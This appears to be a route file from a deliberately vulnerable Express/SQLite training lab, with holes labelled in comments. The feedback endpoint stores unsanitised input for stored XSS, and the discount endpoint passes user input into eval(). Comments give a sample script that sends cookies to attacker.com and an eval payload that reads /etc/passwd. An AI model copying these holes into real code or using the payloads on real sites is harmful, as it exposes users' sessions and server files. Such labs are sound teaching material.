const express = require('express');
const router = express.Router();
const sqlite3 = require('sqlite3').verbose();
const secrets = require('../config/secrets');

const db = new sqlite3.Database(secrets.DB_PATH);

/**
 * GET /product/:id
 * Displays product details and reviews (Stored XSS Trigger)
 */
router.get('/:id', (req, res) => {
    const productId = req.params.id;

    // Vulnerability: IDOR might be possible here if we don't validate productId type
    const query = "SELECT * FROM products WHERE id = ?";
    
    db.get(query, [productId], (err, product) => {
        if (err || !product) {
            return res.status(404).send("Product not found");
        }

        // Fetch Feedback
        // VULNERABILITY: Stored XSS
        // We fetch the comments and render them. If the template uses <%- %> 
        // and the database contains <script>alert(1)</script>, it pops.
        const feedbackQuery = "SELECT * FROM feedback WHERE user_id = ?"; 
        // Note: In a real app this would likely link to product_id, 
        // but for this lab's schema simplicity, we just show generic feedback 
        // or feedback associated with this "item context". 
        // Let's assume for this lab we just dump all feedback for demonstration 
        // or specific feedback if schema allowed. 
        // To make it easy: We'll just select ALL feedback to show "Community Reviews"
        
        db.all("SELECT * FROM feedback", [], (err, feedbacks) => {
             res.render('product', { 
                product: product, 
                feedbacks: feedbacks, // XSS Payload travels here
                user: req.session.user 
            });
        });
    });
});

/**
 * POST /product/feedback
 * Endpoint to post a review
 */
router.post('/feedback', (req, res) => {
    const { comment } = req.body;
    const userId = req.session.user ? req.session.user.id : 0; // 0 = Anonymous

    // ============================================================
    // VULNERABILITY: STORED XSS
    // ============================================================
    // No sanitization is performed on 'comment'.
    // Payload: <script>document.location='http://attacker.com/cookie?c='+document.cookie</script>
    
    const stmt = db.prepare("INSERT INTO feedback (user_id, comment) VALUES (?, ?)");
    stmt.run(userId, comment, (err) => {
        if (err) {
            return res.status(500).send("Error saving feedback");
        }
        // Redirect back to home or product list
        res.redirect('/');
    });
    stmt.finalize();
});

/**
 * POST /product/apply-discount
 * Vulnerable to Server-Side JavaScript Injection (eval)
 */
router.post('/apply-discount', (req, res) => {
    const { code } = req.body;

    // ============================================================
    // VULNERABILITY: CODE INJECTION (via eval)
    // ============================================================
    // We try to be "smart" and allow complex discount logic defined in JS.
    // Attacker sends: "res.end(require('fs').readFileSync('/etc/passwd').toString())"
    
    try {
        // Simulating a calculator that checks if discount code is valid
        const result = eval(`'Discount Code: ' + "${code}"`);
        res.send(`Applying: ${result}`);
    } catch (e) {
        res.send("Invalid code");
    }
});

module.exports = router;